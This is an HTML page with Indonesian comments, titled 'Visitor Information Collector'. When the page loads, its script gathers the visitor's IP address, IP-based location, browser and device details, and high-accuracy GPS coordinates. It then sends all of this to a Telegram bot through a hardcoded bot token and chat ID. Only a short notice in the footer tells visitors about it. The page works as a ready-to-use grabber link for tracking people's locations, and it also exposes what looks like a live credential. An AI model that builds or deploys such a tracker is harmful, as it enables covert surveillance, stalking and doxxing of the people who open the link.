<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Information Collector</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .loading-spinner {
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-white rounded-lg shadow-lg overflow-hidden">
        <div class="bg-gradient-to-r from-blue-600 to-indigo-700 p-4 text-white">
            <h1 class="text-xl font-bold">Visitor Information Collector</h1>
        </div>
        
        <div class="p-6">
            <div id="processingStatus" class="flex items-center space-x-3">
                <svg class="loading-spinner h-6 w-6 text-blue-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <span class="font-medium">Mengumpulkan informasi pengunjung...</span>
            </div>
            
            <div id="resultContainer" class="mt-4 hidden">
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4">
                    <div class="flex items-center">
                        <svg class="h-5 w-5 text-blue-500 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
                        </svg>
                        <p class="text-sm text-blue-700 font-medium" id="statusMessage"></p>
                    </div>
                </div>
            </div>
            
            <div class="mt-6 text-xs text-gray-500">
                <p>Informasi dikumpulkan secara otomatis saat halaman dimuat. Data akan dikirim ke sistem pemantauan.</p>
            </div>
        </div>
    </div>

    <script>
        // Konfigurasi Telegram - GANTI DENGAN DATA ANDA
        const TELEGRAM_BOT_TOKEN = '7950767142:AAGl3GIv8IDK1iAs14tHPezVqxlDMxxBU5I'; // Ganti dengan token bot Anda
        const TELEGRAM_CHAT_ID = '7113683581'; // Ganti dengan chat ID Anda

        // Fungsi untuk mengirim data ke Telegram
        async function sendToTelegram(botToken, chatId, collectedData) {
            try {
                // Format pesan untuk Telegram
                const messageText = formatTelegramMessage(collectedData);
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: messageText,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Gagal mengirim ke Telegram');
                }
                
                return true;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // Format pesan Telegram
        function formatTelegramMessage(data) {
            let message = `<b>üö® NEW VISITOR DETECTED üö®</b>\n\n`;
            message += `üïí <b>Timestamp:</b> ${new Date().toLocaleString()}\n`;
            message += `üåê <b>IP Address:</b> ${data.ip}\n`;
            
            if (data.location) {
                message += `üìç <b>Location:</b>\n`;
                message += `   - Country: ${data.location.country_name || 'Unknown'}\n`;
                message += `   - Region: ${data.location.region || 'Unknown'}\n`;
                message += `   - City: ${data.location.city || 'Unknown'}\n`;
                message += `   - ISP: ${data.location.org || 'Unknown'}\n`;
            }
            
            if (data.gps && data.gps.latitude) {
                message += `üìå <b>GPS Coordinates:</b>\n`;
                message += `   - Latitude: ${data.gps.latitude}\n`;
                message += `   - Longitude: ${data.gps.longitude}\n`;
                message += `   - Accuracy: ¬±${data.gps.accuracy} meters\n`;
                message += `   - <a href="${data.gps.mapsLink}">View on Google Maps</a>\n`;
            }
            
            message += `\nüíª <b>Device Info:</b>\n`;
            message += `   - Type: ${data.device.type}\n`;
            message += `   - Platform: ${data.device.platform}\n`;
            message += `   - Screen: ${data.device.screenWidth}x${data.device.screenHeight}\n`;
            
            message += `\nüîç <b>Browser Info:</b>\n`;
            message += `   - Browser: ${data.browser.name} v${data.browser.version}\n`;
            message += `   - Language: ${data.browser.language}\n`;
            message += `   - Online: ${data.browser.online ? 'Yes' : 'No'}\n`;
            
            return message;
        }

        // Main function yang berjalan otomatis saat halaman dimuat
        async function collectAndSendVisitorInfo() {
            const updateStatus = (message) => {
                document.getElementById('statusMessage').textContent = message;
                document.getElementById('resultContainer').classList.remove('hidden');
            };

            try {
                updateStatus('Mendeteksi alamat IP...');
                
                // 1. Dapatkan alamat IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                // 2. Dapatkan info lokasi berdasarkan IP
                updateStatus('Mendeteksi lokasi...');
                let locationData = {};
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    locationData = await locationResponse.json();
                } catch (locationError) {
                    console.error('Error getting location:', locationError);
                }
                
                // 3. Dapatkan info browser dan perangkat
                updateStatus('Mengumpulkan info perangkat...');
                const browserInfo = getBrowserInfo();
                const deviceInfo = getDeviceInfo();
                
                // 4. Coba dapatkan lokasi GPS jika diizinkan
                updateStatus('Memeriksa akses GPS...');
                let gpsInfo = {};
                try {
                    const position = await getPosition();
                    gpsInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toLocaleString(),
                        mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
                    };
                } catch (gpsError) {
                    gpsInfo = { error: gpsError.message };
                }
                
                // 5. Kirim ke Telegram
                updateStatus('Mengirim data ke sistem...');
                const collectedData = {
                    ip,
                    location: locationData,
                    browser: browserInfo,
                    device: deviceInfo,
                    gps: gpsInfo
                };
                
                await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, collectedData);
                
                // 6. Update status selesai
                setTimeout(() => {
                    updateStatus('‚úÖ Informasi pengunjung telah dikumpulkan dan dikirim.');
                    document.querySelector('.loading-spinner').classList.add('hidden');
                }, 1500);
                
            } catch (error) {
                updateStatus(`‚ùå Error: ${error.message}`);
                document.querySelector('.loading-spinner').classList.add('hidden');
                console.error('Error:', error);
            }
        }

        // Helper functions
        function getPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation tidak didukung'));
                }
                
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName, browserVersion;
            
            // Deteksi browser
            if (ua.includes('Firefox')) {
                browserName = 'Firefox';
                browserVersion = ua.match(/Firefox\/(\d+)/)[1];
            } else if (ua.includes('Edg')) {
                browserName = 'Edge';
                browserVersion = ua.match(/Edg\/(\d+)/)[1];
            } else if (ua.includes('Chrome')) {
                browserName = 'Chrome';
                browserVersion = ua.match(/Chrome\/(\d+)/)[1];
            } else if (ua.includes('Safari')) {
                browserName = 'Safari';
                browserVersion = ua.match(/Version\/(\d+)/)[1];
            } else {
                browserName = 'Unknown';
                browserVersion = 'Unknown';
            }
            
            return {
                name: browserName,
                version: browserVersion,
                userAgent: ua,
                language: navigator.language,
                online: navigator.onLine,
                cookiesEnabled: navigator.cookieEnabled
            };
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceType = 'Desktop';
            
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                deviceType = 'Mobile';
                if (/iPad|tablet/i.test(ua)) {
                    deviceType = 'Tablet';
                }
            }
            
            return {
                type: deviceType,
                platform: navigator.platform,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                pixelRatio: window.devicePixelRatio
            };
        }

        // Jalankan fungsi utama saat halaman selesai dimuat
        document.addEventListener('DOMContentLoaded', collectAndSendVisitorInfo);
    </script>
</body>
</html>
